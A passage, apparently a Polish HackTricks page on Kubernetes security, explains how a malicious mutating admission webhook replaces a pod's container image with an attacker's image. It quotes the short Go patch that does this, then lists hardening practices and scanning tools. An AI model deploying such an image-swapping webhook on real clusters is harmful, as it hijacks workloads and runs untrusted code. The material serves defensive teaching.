Jak mo偶na zobaczy na powy偶szym obrazku, pr贸bowalimy uruchomi obraz `nginx`, ale ostatecznie wykonany zosta obraz `rewanthtammana/malicious-image`. Co si wanie stao!!?

#### Techniczne szczeg贸y <a href="#heading-technicalities" id="heading-technicalities"></a>

Skrypt `./deploy.sh` ustanawia kontroler przyjcia webhooka mutujcego, kt贸ry modyfikuje 偶dania do interfejsu API Kubernetes zgodnie z okrelonymi w jego konfiguracji liniami, wpywajc na obserwowane wyniki:

```
patches = append(patches, patchOperation{
Op:    "replace",
Path:  "/spec/containers/0/image",
Value: "rewanthtammana/malicious-image",
})
```

Powy偶szy fragment zastpuje pierwszy obraz kontenera w ka偶dym podzie przez `rewanthtammana/malicious-image`.

## Najlepsze praktyki

### **Wyczanie automatycznego montowania token贸w konta usugi**

* **Pody i konta usugi**: Domylnie pody montuj token konta usugi. Aby zwikszy bezpieczestwo, Kubernetes umo偶liwia wyczenie tej funkcji automatycznego montowania.
* **Jak zastosowa**: Ustaw `automountServiceAccountToken: false` w konfiguracji kont usugi lub pod贸w, zaczynajc od wersji Kubernetes 1.6.

### **Ograniczenie przypisania u偶ytkownik贸w w RoleBindings/ClusterRoleBindings**

* **Selektywne uwzgldnianie**: Upewnij si, 偶e do RoleBindings lub ClusterRoleBindings s uwzgldniani tylko niezbdni u偶ytkownicy. Regularnie przegldaj i usuwaj nieistotnych u偶ytkownik贸w, aby utrzyma wysokie bezpieczestwo.

### **Role specyficzne dla przestrzeni nazw zamiast roli na poziomie klastra**

* **Role vs. ClusterRoles**: Preferuj korzystanie z r贸l i RoleBindings dla uprawnie specyficznych dla przestrzeni nazw, zamiast ClusterRoles i ClusterRoleBindings, kt贸re maj zastosowanie na poziomie klastra. Taki podejcie oferuje wiksz kontrol i ogranicza zakres uprawnie.

### **U偶ywaj narzdzi automatycznych**

{% embed url="https://github.com/cyberark/KubiScan" %}

{% embed url="https://github.com/aquasecurity/kube-hunter" %}

{% embed url="https://github.com/aquasecurity/kube-bench" %}

## **Odnoniki**

* [**https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions**](https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions)
* [**https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1**](https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1)
* [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers)

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** mnie na **Twitterze**  [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Podziel si swoimi trikami hakerskimi, przesyajc PR do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
